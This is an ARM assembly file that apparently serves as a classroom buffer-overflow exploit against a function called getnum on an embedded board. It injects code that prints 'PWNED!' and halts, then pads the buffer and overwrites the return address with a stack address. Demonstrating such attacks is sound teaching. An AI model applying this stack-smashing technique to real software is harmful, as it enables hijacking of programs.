        .syntax unified

        .equ printf, 0x178      @ Address of serial_printf
        .equ frame, 0x20003f98  @ Captured stack pointer value in getnum

        .text
        @@ Our malicious code
attack:
        sub sp, #40             @ Reserve stack space again
        adr r0, message         @ Address of our message
        ldr r1, =printf+1       @ Absolute address for call
        blx r1                  @ Call printf
        b .                     @ Spin forever
        .pool
message:
        .asciz "PWNED!\r\n"
        .align 5, 0             @ Fill up rest of buffer

        @@ One extra word of padding
        .word 0

        @@ The return address
        .word frame+1
        
